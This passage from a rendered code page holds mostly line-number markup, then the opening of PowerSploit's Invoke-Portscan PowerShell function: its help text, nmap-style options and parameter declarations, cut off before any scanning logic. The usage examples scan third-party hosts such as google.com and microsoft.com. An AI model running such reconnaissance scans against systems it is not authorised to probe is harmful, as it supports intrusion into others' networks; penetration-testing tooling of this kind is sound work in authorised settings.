class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br><span class="line">1093</span><br><span class="line">1094</span><br><span class="line">1095</span><br><span class="line">1096</span><br><span class="line">1097</span><br><span class="line">1098</span><br><span class="line">1099</span><br><span class="line">1100</span><br><span class="line">1101</span><br><span class="line">1102</span><br><span class="line">1103</span><br><span class="line">1104</span><br><span class="line">1105</span><br><span class="line">1106</span><br><span class="line">1107</span><br><span class="line">1108</span><br><span class="line">1109</span><br><span class="line">1110</span><br><span class="line">1111</span><br><span class="line">1112</span><br><span class="line">1113</span><br><span class="line">1114</span><br><span class="line">1115</span><br><span class="line">1116</span><br><span class="line">1117</span><br><span class="line">1118</span><br><span class="line">1119</span><br><span class="line">1120</span><br><span class="line">1121</span><br><span class="line">1122</span><br><span class="line">1123</span><br><span class="line">1124</span><br><span class="line">1125</span><br><span class="line">1126</span><br><span class="line">1127</span><br><span class="line">1128</span><br><span class="line">1129</span><br><span class="line">1130</span><br><span class="line">1131</span><br><span class="line">1132</span><br><span class="line">1133</span><br><span class="line">1134</span><br><span class="line">1135</span><br><span class="line">1136</span><br><span class="line">1137</span><br><span class="line">1138</span><br><span class="line">1139</span><br><span class="line">1140</span><br><span class="line">1141</span><br><span class="line">1142</span><br><span class="line">1143</span><br><span class="line">1144</span><br><span class="line">1145</span><br><span class="line">1146</span><br><span class="line">1147</span><br><span class="line">1148</span><br><span class="line">1149</span><br></pre></td><td class="code"><pre><span class="line">function Invoke-Portscan</span><br><span class="line">&#123;</span><br><span class="line">&lt;#</span><br><span class="line">.SYNOPSIS</span><br><span class="line"></span><br><span class="line">Simple portscan module</span><br><span class="line"></span><br><span class="line">PowerSploit Function: Invoke-Portscan  </span><br><span class="line">Author: Rich Lundeen (http://webstersProdigy.net)  </span><br><span class="line">License: BSD 3-Clause  </span><br><span class="line">Required Dependencies: None  </span><br><span class="line">Optional Dependencies: None  </span><br><span class="line"></span><br><span class="line">.DESCRIPTION</span><br><span class="line"></span><br><span class="line">Does a simple port scan using regular sockets, based (pretty) loosely on nmap</span><br><span class="line"></span><br><span class="line">.PARAMETER Hosts</span><br><span class="line"></span><br><span class="line">Include these comma seperated hosts (supports IPv4 CIDR notation) or pipe them in</span><br><span class="line"></span><br><span class="line">.PARAMETER HostFile</span><br><span class="line"></span><br><span class="line">Input hosts from file rather than commandline</span><br><span class="line"></span><br><span class="line">.PARAMETER ExcludeHosts</span><br><span class="line"></span><br><span class="line">Exclude these comma seperated hosts</span><br><span class="line"></span><br><span class="line">.PARAMETER Ports</span><br><span class="line"></span><br><span class="line">Include these comma seperated ports (can also be a range like 80-90)</span><br><span class="line"></span><br><span class="line">.PARAMETER PortFile</span><br><span class="line"></span><br><span class="line">Input ports from a file</span><br><span class="line"></span><br><span class="line">.PARAMETER TopPorts</span><br><span class="line"></span><br><span class="line">Include the x top ports - only goes to 1000, default is top 50</span><br><span class="line"></span><br><span class="line">.PARAMETER ExcludedPorts</span><br><span class="line"></span><br><span class="line">Exclude these comma seperated ports</span><br><span class="line"></span><br><span class="line">.PARAMETER SkipDiscovery</span><br><span class="line"></span><br><span class="line">Treat all hosts as online, skip host discovery</span><br><span class="line"></span><br><span class="line">.PARAMETER PingOnly</span><br><span class="line"></span><br><span class="line">Ping scan only (disable port scan)</span><br><span class="line"></span><br><span class="line">.PARAMETER DiscoveryPorts</span><br><span class="line"></span><br><span class="line">Comma separated ports used for host discovery. -1 is a ping</span><br><span class="line"></span><br><span class="line">.PARAMETER Threads</span><br><span class="line"></span><br><span class="line">number of max threads for the thread pool (per host)</span><br><span class="line"></span><br><span class="line">.PARAMETER nHosts</span><br><span class="line"></span><br><span class="line">number of hosts to concurrently scan</span><br><span class="line"></span><br><span class="line">.PARAMETER Timeout</span><br><span class="line"></span><br><span class="line">Timeout time on a connection in miliseconds before port is declared filtered</span><br><span class="line"></span><br><span class="line">.PARAMETER SleepTimer</span><br><span class="line"></span><br><span class="line">Wait before thread checking, in miliseconds</span><br><span class="line"></span><br><span class="line">.PARAMETER SyncFreq</span><br><span class="line"></span><br><span class="line">How often (in terms of hosts) to sync threads and flush output</span><br><span class="line"></span><br><span class="line">.PARAMETER T</span><br><span class="line"></span><br><span class="line">[0-5] shortcut performance options. Default is 3. higher is more aggressive. Sets (nhosts, threads,timeout)</span><br><span class="line">    5 &#123;$nHosts=30;  $Threads = 1000; $Timeout = 750  &#125;</span><br><span class="line">    4 &#123;$nHosts=25;  $Threads = 1000; $Timeout = 1200 &#125;</span><br><span class="line">    3 &#123;$nHosts=20;  $Threads = 100;  $Timeout = 2500 &#125;</span><br><span class="line">    2 &#123;$nHosts=15;  $Threads = 32;   $Timeout = 3000 &#125;</span><br><span class="line">    1 &#123;$nHosts=10;  $Threads = 32;   $Timeout = 5000 &#125;</span><br><span class="line"></span><br><span class="line">.PARAMETER GrepOut</span><br><span class="line"></span><br><span class="line">Greppable output file</span><br><span class="line"></span><br><span class="line">.PARAMETER XmlOut</span><br><span class="line"></span><br><span class="line">output XML file</span><br><span class="line"></span><br><span class="line">.PARAMETER ReadableOut</span><br><span class="line"></span><br><span class="line">output file in &#x27;readable&#x27; format</span><br><span class="line"></span><br><span class="line">.PARAMETER AllformatsOut</span><br><span class="line"></span><br><span class="line">output in readable (.nmap), xml (.xml), and greppable (.gnmap) formats</span><br><span class="line"></span><br><span class="line">.PARAMETER noProgressMeter</span><br><span class="line"></span><br><span class="line">Suppresses the progress meter</span><br><span class="line"></span><br><span class="line">.PARAMETER quiet</span><br><span class="line"></span><br><span class="line">supresses returned output and don&#x27;t store hosts in memory - useful for very large scans</span><br><span class="line"></span><br><span class="line">.PARAMETER ForceOverwrite</span><br><span class="line"></span><br><span class="line">Force Overwrite if output Files exist. Otherwise it throws exception</span><br><span class="line"></span><br><span class="line">.EXAMPLE</span><br><span class="line"></span><br><span class="line">Invoke-Portscan -Hosts &quot;webstersprodigy.net,google.com,microsoft.com&quot; -TopPorts 50</span><br><span class="line"></span><br><span class="line">Description</span><br><span class="line">-----------</span><br><span class="line">Scans the top 50 ports for hosts found for webstersprodigy.net,google.com, and microsoft.com</span><br><span class="line"></span><br><span class="line">.EXAMPLE</span><br><span class="line"></span><br><span class="line">echo webstersprodigy.net | Invoke-Portscan -oG test.gnmap -f -ports &quot;80,443,8080&quot;</span><br><span class="line"></span><br><span class="line">Description</span><br><span class="line">-----------</span><br><span class="line">Does a portscan of &quot;webstersprodigy.net&quot;, and writes a greppable output file</span><br><span class="line"></span><br><span class="line">.EXAMPLE</span><br><span class="line"></span><br><span class="line">Invoke-Portscan -Hosts 192.168.1.1/24 -T 4 -TopPorts 25 -oA localnet</span><br><span class="line"></span><br><span class="line">Description</span><br><span class="line">-----------</span><br><span class="line">Scans the top 20 ports for hosts found in the 192.168.1.1/24 range, outputs all file formats</span><br><span class="line"></span><br><span class="line">.LINK</span><br><span class="line"></span><br><span class="line">http://webstersprodigy.net</span><br><span class="line">#&gt;</span><br><span class="line"></span><br><span class="line">    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(&#x27;PSUseShouldProcessForStateChangingFunctions&#x27;, &#x27;&#x27;)]</span><br><span class="line">    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(&#x27;PSUseSingularNouns&#x27;, &#x27;&#x27;)]</span><br><span class="line">    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(&#x27;PSUseApprovedVerbs&#x27;, &#x27;&#x27;)]</span><br><span class="line">    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(&#x27;PSShouldProcess&#x27;, &#x27;&#x27;)]</span><br><span class="line">    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(&#x27;PSUseLiteralInitializerForHashtable&#x27;, &#x27;&#x27;)]</span><br><span class="line">    [CmdletBinding()]</span><br><span class="line">    Param (</span><br><span class="line">        #Host, Ports</span><br><span class="line">        [Parameter(ParameterSetName=&quot;cmdHosts&quot;,</span><br><span class="line"></span><br><span class="line">                   ValueFromPipeline=$True,</span><br><span class="line">                   Mandatory = $True)]</span><br><span class="line">                   [String[]] $Hosts,</span><br><span class="line"></span><br><span class="line">        [Parameter(ParameterSetName=&quot;fHosts&quot;,</span><br><span class="line">                   Mandatory = $True)]</span><br><span class="line">                   [Alias(&quot;iL&quot;)]</span><br><span class="line">                   [String]  $HostFile,</span><br><span class="line"></span><br><span class="line">        [Parameter(Mandatory = $False)]</span><br><span class="line">                   [Alias(&quot;exclude&quot;)]</span><br><span class="line">                   [String] $ExcludeHosts,</span><br><span class="line"></span><br><span class="line">        [Parameter(Mandatory = $False)]</span><br><span class="line">                   [Alias(&quot;p&quot;)]</span><br><span class="line">                   [String] $Ports,</span><br><span class="line"></span><br><span class="line">        [Parameter(Mandatory = $False)]</span><br><span class="line">                   [Alias(&quot;iP&quot;)]</span><br><span class="line">                   [String] $PortFile,</span><br><span class="line"></span><br><span class="line">        [Parameter(Mandatory = $False)]</span><br><span class="line">                   [String] $TopPorts,</span><br><span class="line"></span><br><span class="line">        [Parameter(Mandatory = $False)]</span><br><span class="line">                   [Alias(&quot;xPorts&quot;)]</span><br><span class="line">                   [String] $ExcludedPorts,</span><br><span class="line"></span><br><span class="line">        #Host Discovery</span><br><span class="line">        [Parameter(Mandatory = $False)]</span><br><span class="line">                   [Alias(&quot;Pn&quot;)]</span><br><span class="line">                   [Switch] $SkipDiscovery,</span><br><span class="line"></span><br><span class="line">        [Parameter(Mandatory = $False)]</span><br><span class="line">                   [Alias(&quot;sn&quot;)]</span><br><span class="line">                   [Switch] $PingOnly,</span><br><span class="line"></span><br><span class="line">        [Parameter(Mandatory = $False)]</span><br><span class="line">                   [Alias(&quot;PS&quot;)]</span><br><span class="line">                   [string] $DiscoveryPorts = &quot;-1,445,80,443&quot;,</span><br><span class="line"></span><br><span class="line">        #Timing and Performance</span><br><span class="line">        [Parameter(Mandatory = $False)]</span><br><span class="line">                   [int] $Threads = 100,</span><br><span class="line"></span><br><span class="line">        [Parameter(Mandatory = $False)]</span><br><span class="line">                   [int] $nHosts = 25,</span><br><span class="line"></span><br><span class="line">        [Parameter(Mandatory = $False)]</span><br><span class="line">                   [int] $Timeout = 2000,</span><br><span class="line"></span><br><span class="line">        [Parameter(Mandatory = $False)]</span><br><span class="line">                   [int] $SleepTimer = 500,</span><br><span class="line"></span><br><span class="line">        [Parameter(Mandatory = $False)]</span><br><span class="line">                   [int] $SyncFreq = 1024,</span><br><span class="line"></span><br><span class="line">        [Parameter(Mandatory = $False)]</span><br><span class="line">                   [int] $T,</span><br><span class="line"></span><br><span class="line">        #Output</span><br><span class="line">        [Parameter(Mandatory = $False)]</span><br><span class="line">                   [Alias(&quot;oG&quot;)]</span><br><span class="line">                   [String] $GrepOut,</span><br><span class="line"></span><br><span class="line">        [Parameter(Mandatory = $False)]</span><br><span class="line">                   [Alias(&quot;oX&quot;)]</span><br><span class="line">                   [String] $XmlOut,</span><br><span class="line"></span><br><span class="line">        [Parameter(Mandatory = $False)]</span><br><span class="line">                   [Alias(&quot;oN&quot;)]</span><br><span class="line">                   [String] $ReadableOut,</span><br><span class="line"></span><br><span class="line">        [Parameter(Mandatory = $False)]</span><br><span class="line">                   [Alias(&quot;oA&quot;)]</span><br><span class="line">                   [String] $AllformatsOut,</span><br><span class="line"></span><br><span class="line">        [Parameter(Mandatory = $False)]</span><br><span class="line">                   [Switch] $noProgressMeter,</span><br><span class="line"></span><br><span class="line">        [Parameter(Mandatory = $False)]</span><br><span class="line">                   [Alias(&quot;q&quot;)]</span><br><span class="line">                   [Switch] $quiet,</span><br><span class="line"></span><br><span class="line">        [Parameter(Mandatory = $False)]</span><br><span class="line">                   